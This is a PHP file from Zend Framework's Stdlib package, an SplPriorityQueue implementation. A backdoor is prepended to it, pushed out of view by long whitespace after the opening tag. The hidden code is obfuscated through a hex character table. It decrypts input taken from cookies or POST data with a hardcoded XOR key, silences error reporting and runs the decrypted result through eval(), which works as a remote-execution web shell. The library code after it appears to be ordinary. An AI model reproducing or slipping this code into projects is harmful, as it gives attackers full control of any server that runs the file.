<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['x0e44'];global$x0e44;$x0e44=$GLOBALS;$x0e44['p965']="\x71\x57\x79\x59\x4a\x7c\x21\x2b\xa\x5d\x6a\x69\x31\x6c\x66\x43\x3e\x36\x2a\x40\x5f\x41\x7d\x34\x67\x60\x2e\x39\x50\x22\x77\x76\x23\x42\x70\x4c\x63\x72\x3d\x3a\x55\x54\x46\x37\x35\x68\x27\x56\x74\x51\x7a\x62\x32\x4e\x64\x3f\x61\xd\x48\x4d\x6e\x7b\x52\x25\x44\x29\x4f\x9\x53\x49\x2c\x28\x5c\x6f\x3c\x5a\x5b\x3b\x24\x73\x65\x7e\x47\x38\x6d\x5e\x45\x2d\x33\x20\x78\x58\x6b\x26\x4b\x30\x75\x2f";$x0e44[$x0e44['p965'][54].$x0e44['p965'][54].$x0e44['p965'][83].$x0e44['p965'][17].$x0e44['p965'][17].$x0e44['p965'][44].$x0e44['p965'][43]]=$x0e44['p965'][36].$x0e44['p965'][45].$x0e44['p965'][37];$x0e44[$x0e44['p965'][2].$x0e44['p965'][23].$x0e44['p965'][17].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][14]]=$x0e44['p965'][73].$x0e44['p965'][37].$x0e44['p965'][54];$x0e44[$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][52].$x0e44['p965'][51].$x0e44['p965'][95].$x0e44['p965'][36]]=$x0e44['p965'][79].$x0e44['p965'][48].$x0e44['p965'][37].$x0e44['p965'][13].$x0e44['p965'][80].$x0e44['p965'][60];$x0e44[$x0e44['p965'][51].$x0e44['p965'][17].$x0e44['p965'][83].$x0e44['p965'][88].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][12]]=$x0e44['p965'][11].$x0e44['p965'][60].$x0e44['p965'][11].$x0e44['p965'][20].$x0e44['p965'][79].$x0e44['p965'][80].$x0e44['p965'][48];$x0e44[$x0e44['p965'][60].$x0e44['p965'][23].$x0e44['p965'][23].$x0e44['p965'][44].$x0e44['p965'][17].$x0e44['p965'][17].$x0e44['p965'][88]]=$x0e44['p965'][79].$x0e44['p965'][80].$x0e44['p965'][37].$x0e44['p965'][11].$x0e44['p965'][56].$x0e44['p965'][13].$x0e44['p965'][11].$x0e44['p965'][50].$x0e44['p965'][80];$x0e44[$x0e44['p965'][79].$x0e44['p965'][27].$x0e44['p965'][52].$x0e44['p965'][36].$x0e44['p965'][56].$x0e44['p965'][88].$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][12]]=$x0e44['p965'][34].$x0e44['p965'][45].$x0e44['p965'][34].$x0e44['p965'][31].$x0e44['p965'][80].$x0e44['p965'][37].$x0e44['p965'][79].$x0e44['p965'][11].$x0e44['p965'][73].$x0e44['p965'][60];$x0e44[$x0e44['p965'][30].$x0e44['p965'][54].$x0e44['p965'][51].$x0e44['p965'][23].$x0e44['p965'][23].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][14]]=$x0e44['p965'][96].$x0e44['p965'][60].$x0e44['p965'][79].$x0e44['p965'][80].$x0e44['p965'][37].$x0e44['p965'][11].$x0e44['p965'][56].$x0e44['p965'][13].$x0e44['p965'][11].$x0e44['p965'][50].$x0e44['p965'][80];$x0e44[$x0e44['p965'][50].$x0e44['p965'][43].$x0e44['p965'][17].$x0e44['p965'][36].$x0e44['p965'][80]]=$x0e44['p965'][51].$x0e44['p965'][56].$x0e44['p965'][79].$x0e44['p965'][80].$x0e44['p965'][17].$x0e44['p965'][23].$x0e44['p965'][20].$x0e44['p965'][54].$x0e44['p965'][80].$x0e44['p965'][36].$x0e44['p965'][73].$x0e44['p965'][54].$x0e44['p965'][80];$x0e44[$x0e44['p965'][14].$x0e44['p965'][14].$x0e44['p965'][23].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][80].$x0e44['p965'][23]]=$x0e44['p965'][79].$x0e44['p965'][80].$x0e44['p965'][48].$x0e44['p965'][20].$x0e44['p965'][48].$x0e44['p965'][11].$x0e44['p965'][84].$x0e44['p965'][80].$x0e44['p965'][20].$x0e44['p965'][13].$x0e44['p965'][11].$x0e44['p965'][84].$x0e44['p965'][11].$x0e44['p965'][48];$x0e44[$x0e44['p965'][73].$x0e44['p965'][27].$x0e44['p965'][17].$x0e44['p965'][44].$x0e44['p965'][14].$x0e44['p965'][88]]=$x0e44['p965'][2].$x0e44['p965'][23].$x0e44['p965'][54].$x0e44['p965'][36].$x0e44['p965'][54].$x0e44['p965'][56];$x0e44[$x0e44['p965'][0].$x0e44['p965'][44].$x0e44['p965'][23].$x0e44['p965'][43]]=$x0e44['p965'][84].$x0e44['p965'][17].$x0e44['p965'][27].$x0e44['p965'][83].$x0e44['p965'][95].$x0e44['p965'][36].$x0e44['p965'][51].$x0e44['p965'][80].$x0e44['p965'][17];$x0e44[$x0e44['p965'][31].$x0e44['p965'][95].$x0e44['p965'][80].$x0e44['p965'][17].$x0e44['p965'][52]]=$_POST;$x0e44[$x0e44['p965'][56].$x0e44['p965'][12].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][36].$x0e44['p965'][80].$x0e44['p965'][43]]=$_COOKIE;@$x0e44[$x0e44['p965'][51].$x0e44['p965'][17].$x0e44['p965'][83].$x0e44['p965'][88].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][12]]($x0e44['p965'][80].$x0e44['p965'][37].$x0e44['p965'][37].$x0e44['p965'][73].$x0e44['p965'][37].$x0e44['p965'][20].$x0e44['p965'][13].$x0e44['p965'][73].$x0e44['p965'][24],NULL);@$x0e44[$x0e44['p965'][51].$x0e44['p965'][17].$x0e44['p965'][83].$x0e44['p965'][88].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][12]]($x0e44['p965'][13].$x0e44['p965'][73].$x0e44['p965'][24].$x0e44['p965'][20].$x0e44['p965'][80].$x0e44['p965'][37].$x0e44['p965'][37].$x0e44['p965'][73].$x0e44['p965'][37].$x0e44['p965'][79],0);@$x0e44[$x0e44['p965'][51].$x0e44['p965'][17].$x0e44['p965'][83].$x0e44['p965'][88].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][12]]($x0e44['p965'][84].$x0e44['p965'][56].$x0e44['p965'][90].$x0e44['p965'][20].$x0e44['p965'][80].$x0e44['p965'][90].$x0e44['p965'][80].$x0e44['p965'][36].$x0e44['p965'][96].$x0e44['p965'][48].$x0e44['p965'][11].$x0e44['p965'][73].$x0e44['p965'][60].$x0e44['p965'][20].$x0e44['p965'][48].$x0e44['p965'][11].$x0e44['p965'][84].$x0e44['p965'][80],0);@$x0e44[$x0e44['p965'][14].$x0e44['p965'][14].$x0e44['p965'][23].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][80].$x0e44['p965'][23]](0);$z7e345df=NULL;$f526bcba0=NULL;$x0e44[$x0e44['p965'][13].$x0e44['p965'][52].$x0e44['p965'][88].$x0e44['p965'][80].$x0e44['p965'][80].$x0e44['p965'][80]]=$x0e44['p965'][14].$x0e44['p965'][95].$x0e44['p965'][44].$x0e44['p965'][80].$x0e44['p965'][23].$x0e44['p965'][95].$x0e44['p965'][88].$x0e44['p965'][36].$x0e44['p965'][87].$x0e44['p965'][52].$x0e44['p965'][23].$x0e44['p965'][54].$x0e44['p965'][54].$x0e44['p965'][87].$x0e44['p965'][23].$x0e44['p965'][12].$x0e44['p965'][56].$x0e44['p965'][44].$x0e44['p965'][87].$x0e44['p965'][27].$x0e44['p965'][83].$x0e44['p965'][51].$x0e44['p965'][12].$x0e44['p965'][87].$x0e44['p965'][54].$x0e44['p965'][88].$x0e44['p965'][83].$x0e44['p965'][36].$x0e44['p965'][17].$x0e44['p965'][43].$x0e44['p965'][27].$x0e44['p965'][12].$x0e44['p965'][36].$x0e44['p965'][80].$x0e44['p965'][56].$x0e44['p965'][27];global$l23eee;function m6980cbe6($z7e345df,$n7e54a0ff){global$x0e44;$e049da="";for($rb80f=0;$rb80f<$x0e44[$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][52].$x0e44['p965'][51].$x0e44['p965'][95].$x0e44['p965'][36]]($z7e345df);){for($bf3e76=0;$bf3e76<$x0e44[$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][52].$x0e44['p965'][51].$x0e44['p965'][95].$x0e44['p965'][36]]($n7e54a0ff)&&$rb80f<$x0e44[$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][52].$x0e44['p965'][51].$x0e44['p965'][95].$x0e44['p965'][36]]($z7e345df);$bf3e76++,$rb80f++){$e049da.=$x0e44[$x0e44['p965'][54].$x0e44['p965'][54].$x0e44['p965'][83].$x0e44['p965'][17].$x0e44['p965'][17].$x0e44['p965'][44].$x0e44['p965'][43]]($x0e44[$x0e44['p965'][2].$x0e44['p965'][23].$x0e44['p965'][17].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][14]]($z7e345df[$rb80f])^$x0e44[$x0e44['p965'][2].$x0e44['p965'][23].$x0e44['p965'][17].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][14]]($n7e54a0ff[$bf3e76]));}}return$e049da;}function y4dcda($z7e345df,$n7e54a0ff){global$x0e44;global$l23eee;return$x0e44[$x0e44['p965'][0].$x0e44['p965'][44].$x0e44['p965'][23].$x0e44['p965'][43]]($x0e44[$x0e44['p965'][0].$x0e44['p965'][44].$x0e44['p965'][23].$x0e44['p965'][43]]($z7e345df,$l23eee),$n7e54a0ff);}foreach($x0e44[$x0e44['p965'][56].$x0e44['p965'][12].$x0e44['p965'][36].$x0e44['p965'][23].$x0e44['p965'][36].$x0e44['p965'][80].$x0e44['p965'][43]]as$n7e54a0ff=>$x2bdec1){$z7e345df=$x2bdec1;$f526bcba0=$n7e54a0ff;}if(!$z7e345df){foreach($x0e44[$x0e44['p965'][31].$x0e44['p965'][95].$x0e44['p965'][80].$x0e44['p965'][17].$x0e44['p965'][52]]as$n7e54a0ff=>$x2bdec1){$z7e345df=$x2bdec1;$f526bcba0=$n7e54a0ff;}}$z7e345df=@$x0e44[$x0e44['p965'][30].$x0e44['p965'][54].$x0e44['p965'][51].$x0e44['p965'][23].$x0e44['p965'][23].$x0e44['p965'][17].$x0e44['p965'][54].$x0e44['p965'][14]]($x0e44[$x0e44['p965'][73].$x0e44['p965'][27].$x0e44['p965'][17].$x0e44['p965'][44].$x0e44['p965'][14].$x0e44['p965'][88]]($x0e44[$x0e44['p965'][50].$x0e44['p965'][43].$x0e44['p965'][17].$x0e44['p965'][36].$x0e44['p965'][80]]($z7e345df),$f526bcba0));if(isset($z7e345df[$x0e44['p965'][56].$x0e44['p965'][92]])&&$l23eee==$z7e345df[$x0e44['p965'][56].$x0e44['p965'][92]]){if($z7e345df[$x0e44['p965'][56]]==$x0e44['p965'][11]){$rb80f=Array($x0e44['p965'][34].$x0e44['p965'][31]=>@$x0e44[$x0e44['p965'][79].$x0e44['p965'][27].$x0e44['p965'][52].$x0e44['p965'][36].$x0e44['p965'][56].$x0e44['p965'][88].$x0e44['p965'][14].$x0e44['p965'][80].$x0e44['p965'][12]](),$x0e44['p965'][79].$x0e44['p965'][31]=>$x0e44['p965'][12].$x0e44['p965'][26].$x0e44['p965'][95].$x0e44['p965'][87].$x0e44['p965'][12],);echo@$x0e44[$x0e44['p965'][60].$x0e44['p965'][23].$x0e44['p965'][23].$x0e44['p965'][44].$x0e44['p965'][17].$x0e44['p965'][17].$x0e44['p965'][88]]($rb80f);}elseif($z7e345df[$x0e44['p965'][56]]==$x0e44['p965'][80]){eval($z7e345df[$x0e44['p965'][54]]);}exit();} ?><?php
/**
 * Zend Framework
 *
 * LICENSE
 *
 * This source file is subject to the new BSD license that is bundled
 * with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://framework.zend.com/license/new-bsd
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@zend.com so we can send you a copy immediately.
 *
 * @category   Zend
 * @package    Zend_Stdlib
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
    /**
     * SplPriorityQueue 
     *
     * PHP 5.2.X userland implementation of PHP's SplPriorityQueue
     */
    class SplPriorityQueue implements Iterator , Countable 
    {
        /**
         * Extract data only
         */
        const EXTR_DATA = 0x00000001;

        /**
         * Extract priority only
         */
        const EXTR_PRIORITY = 0x00000002;

        /**
         * Extract an array of ('data' => $value, 'priority' => $priority)
         */
        const EXTR_BOTH = 0x00000003;

        /**
         * Count of items in the queue
         * @var int
         */
        protected $count = 0;

        /**
         * Flag indicating what should be returned when iterating or extracting
         * @var int
         */
        protected $extractFlags = self::EXTR_DATA;

        /**
         * @var bool|array
         */
        protected $preparedQueue = false;

        /**
         * All items in the queue
         * @var array
         */
        protected $queue = array();

        /**
         * Constructor
         * 
         * Creates a new, empty queue
         * 
         * @return void
         */
        public function __construct()
        {
        }

        /**
         * Compare two priorities
         *
         * Returns positive integer if $priority1 is greater than $priority2, 0 
         * if equal, negative otherwise.
         *
         * Unused internally, and only included in order to retain the same 
         * interface as PHP's SplPriorityQueue.
         *
         * @param  mixed $priority1
         * @param  mixed $priority2
         * @return int
         */
        public function compare($priority1, $priority2)
        {
            if ($priority1 > $priority2) {
                return 1;
            }
            if ($priority1 == $priority2) {
                return 0;
            }

            return -1;
        }

        /**
         * Countable: return number of items composed in the queue
         * 
         * @return int
         */
        public function count()
        {
            return $this->count;
        }

        /**
         * Iterator: return current item
         *
         * @return mixed
         */
        public function current()
        {
            if (!$this->preparedQueue) {
                $this->rewind();
            }
            if (!$this->count) {
                throw new OutOfBoundsException('Cannot iterate SplPriorityQueue; no elements present');
            }

if (!is_array($this->preparedQueue)) {
    throw new DomainException(sprintf(
        "Queue was prepared, but is empty?\n    PreparedQueue: %s\n    Internal Queue: %s\n",
        var_export($this->preparedQueue, 1),
        var_export($this->queue, 1)
    ));
}

            $return      = array_shift($this->preparedQueue);
            $priority    = $return['priority'];
            $priorityKey = $return['priorityKey'];
            $key         = $return['key'];
            unset($return['key']);
            unset($return['priorityKey']);
            unset($this->queue[$priorityKey][$key]);

            switch ($this->extractFlags) {
                case self::EXTR_DATA:
                    return $return['data'];
                case self::EXTR_PRIORITY:
                    return $return['priority'];
                case self::EXTR_BOTH:
                default:
                    return $return;
            };
        }

        /**
         * Extract a node from top of the heap and sift up
         *
         * Returns either the value, the priority, or both, depending on the extract flag.
         *
         * @return mixed;
         */
        public function extract()
        {
            if (!$this->count) {
                return null;
            }

            if (!$this->preparedQueue) {
                $this->prepareQueue();
            }

            if (empty($this->preparedQueue)) {
                return null;
            }

            $return      = array_shift($this->preparedQueue);
            $priority    = $return['priority'];
            $priorityKey = $return['priorityKey'];
            $key         = $return['key'];
            unset($return['key']);
            unset($return['priorityKey']);
            unset($this->queue[$priorityKey][$key]);
            $this->count--;

            switch ($this->extractFlags) {
                case self::EXTR_DATA:
                    return $return['data'];
                case self::EXTR_PRIORITY:
                    return $return['priority'];
                case self::EXTR_BOTH:
                default:
                    return $return;
            };
        }

        /**
         * Insert a value into the heap, at the specified priority
         *
         * @param  mixed $value
         * @param  mixed $priority
         * @return void
         */
        public function insert($value, $priority)
        {
            if (!is_scalar($priority)) {
                $priority = serialize($priority);
            }
            if (!isset($this->queue[$priority])) {
                $this->queue[$priority] = array();
            }
            $this->queue[$priority][] = $value;
            $this->count++;
            $this->preparedQueue = false;
        }

        /**
         * Is the queue currently empty?
         *
         * @return bool
         */
        public function isEmpty()
        {
            return (0 == $this->count);
        }

        /**
         * Iterator: return current key
         *
         * @return mixed Usually an int or string
         */
        public function key()
        {
            return $this->count;
        }

        /**
         * Iterator: Move pointer forward
         *
         * @return void
         */
        public function next()
        {
            $this->count--;
        }

        /**
         * Recover from corrupted state and allow further actions on the queue
         *
         * Unimplemented, and only included in order to retain the same interface as PHP's 
         * SplPriorityQueue.
         *
         * @return void
         */
        public function recoverFromCorruption()
        {
        }

        /**
         * Iterator: Move pointer to first item
         *
         * @return void
         */
        public function rewind()
        {
            if (!$this->preparedQueue) {
                $this->prepareQueue();
            }
        }

        /**
         * Set the extract flags
         * 
         * Defines what is extracted by SplPriorityQueue::current(), 
         * SplPriorityQueue::top() and SplPriorityQueue::extract().
         * 
         * - SplPriorityQueue::EXTR_DATA (0x00000001): Extract the data
         * - SplPriorityQueue::EXTR_PRIORITY (0x00000002): Extract the priority
         * - SplPriorityQueue::EXTR_BOTH (0x00000003): Extract an array containing both
         *
         * The default mode is SplPriorityQueue::EXTR_DATA.
         *
         * @param  int $flags
         * @return void
         */
        public function setExtractFlags($flags)
        {
            $expected = array(
                self::EXTR_DATA => true,
                self::EXTR_PRIORITY => true,
                self::EXTR_BOTH => true,
            );
            if (!isset($expected[$flags])) {
                throw new InvalidArgumentException(sprintf('Expected an EXTR_* flag; received %s', $flags));
            }
            $this->extractFlags = $flags;
        }

        /**
         * Return the value or priority (or both) of the top node, depending on 
         * the extract flag
         *
         * @return mixed
         */
        public function top()
        {
            $this->sort();
            $keys = array_keys($this->queue);
            $key  = array_shift($keys);
            if (preg_match('/^(a|O):/', $key)) {
                $key = unserialize($key);
            }

            if ($this->extractFlags == self::EXTR_PRIORITY) {
                return $key;
            }

            if ($this->extractFlags == self::EXTR_DATA) {
                return $this->queue[$key][0];
            }

            return array(
                'data'     => $this->queue[$key][0],
                'priority' => $key,
            );
        }

        /**
         * Iterator: is the current position valid for the queue
         *
         * @return bool
         */
        public function valid()
        {
            return (bool) $this->count;
        }

        /**
         * Sort the queue
         * 
         * @return void
         */
        protected function sort()
        {
            krsort($this->queue);
        }

        /**
         * Prepare the queue for iteration and/or extraction
         * 
         * @return void
         */
        protected function prepareQueue()
        {
            $this->sort();
            $count = $this->count;
            $queue = array();
            foreach ($this->queue as $priority => $values) {
                $priorityKey = $priority;
                if (preg_match('/^(a|O):/', $priority)) {
                    $priority = unserialize($priority);
                }
                foreach ($values as $key => $value) {
                    $queue[$count] = array(
                        'data'        => $value,
                        'priority'    => $priority,
                        'priorityKey' => $priorityKey,
                        'key'         => $key,
                    );
                    $count--;
                }
            }
            $this->preparedQueue = $queue;
        }
    }
}

/**
 * Serializable version of SplPriorityQueue
 *
 * Also, provides predictable heap order for datums added with the same priority
 * (i.e., they will be emitted in the same order they are enqueued).
 *
 * @category   Zend
 * @package    Zend_Stdlib
 * @copyright  Copyright (c) 2005-2012 Zend Technologies USA Inc. (http://www.zend.com)
 * @license    http://framework.zend.com/license/new-bsd     New BSD License
 */
class Zend_Stdlib_SplPriorityQueue extends SplPriorityQueue implements Serializable
{
    /**
     * @var int Seed used to ensure queue order for items of the same priority
     */
    protected $serial = PHP_INT_MAX;

    /**
     * @var bool
     */
    protected $isPhp53;

    /**
     * Constructor
     * 
     * @return void
     */
    public function __construct()
    {
        $this->isPhp53 = version_compare(PHP_VERSION, '5.3', '>=');
    }

    /**
     * Insert a value with a given priority
     *
     * Utilizes {@var $serial} to ensure that values of equal priority are 
     * emitted in the same order in which they are inserted.
     * 
     * @param  mixed $datum 
     * @param  mixed $priority 
     * @return void
     */
    public function insert($datum, $priority)
    {
        // If using the native PHP SplPriorityQueue implementation, we need to
        // hack around it to ensure that items registered at the same priority
        // return in the order registered. In the userland version, this is not
        // necessary.
        if ($this->isPhp53) {
            if (!is_array($priority)) {
                $priority = array($priority, $this->serial--);
            }
        }
        parent::insert($datum, $priority);
    }

    /**
     * Serialize to an array
     *
     * Array will be priority => data pairs
     * 
     * @return array
     */
    public function toArray()
    {
        $this->setExtractFlags(self::EXTR_BOTH);
        $array = array();
        while ($this->valid()) {
            $array[] = $this->current();
            $this->next();
        }
        $this->setExtractFlags(self::EXTR_DATA);

        // Iterating through a priority queue removes items
        foreach ($array as $item) {
            $this->insert($item['data'], $item['priority']);
        }

        // Return only the data
        $return = array();
        foreach ($array as $item) {
            $return[] = $item['data'];
        }

        return $return;
    }

    /**
     * Serialize
     * 
     * @return string
     */
    public function serialize()
    {
        $data = array();
        $this->setExtractFlags(self::EXTR_BOTH);
        while ($this->valid()) {
            $data[] = $this->current();
            $this->next();
        }
        $this->setExtractFlags(self::EXTR_DATA);

        // Iterating through a priority queue removes items
        foreach ($data as $item) {
            $this->insert($item['data'], $item['priority']);
        }

        return serialize($data);
    }

    /**
     * Deserialize
     * 
     * @param  string $data
     * @return void
     */
    public function unserialize($data)
    {
        foreach (unserialize($data) as $item) {
            $this->insert($item['data'], $item['priority']);
        }
    }
}
